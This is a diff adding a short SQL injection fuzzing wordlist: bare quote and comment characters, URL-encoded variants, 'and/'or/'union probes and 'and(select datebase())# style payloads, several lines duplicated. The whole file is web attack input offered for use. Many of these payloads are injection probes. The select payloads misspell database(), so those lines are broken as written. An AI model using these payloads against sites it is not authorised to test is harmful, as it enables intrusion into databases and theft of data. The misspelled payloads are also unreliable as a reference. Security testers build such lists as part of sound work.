@@ -1,0 +1,41 @@
+"
+'
+=
+'#
+'%23
+%27%23
+"#
+"%27
+'=#
+'and#
+'or#
+'union#
+'and%23
+'and%23
+'or%23
+'union%23
+
+%27and#
+%27or#
+%27union#
+%27and%23
+%27and%23
+%27or%23
+%27union%23
+
+'and(select datebase())#
+'or(select datebase())#
+'union(select datebase())#
+'and(select datebase())%23
+'and(select datebase())%23
+'or(select datebase())%23
+'union(select datebase())%23
+
+%27and(select datebase())#
+%27or(select datebase())#
+%27union(select datebase())#
+%27and(select datebase())%23
+%27and(select datebase())%23
+%27or(select datebase())%23
+%27union(select datebase())%23
+
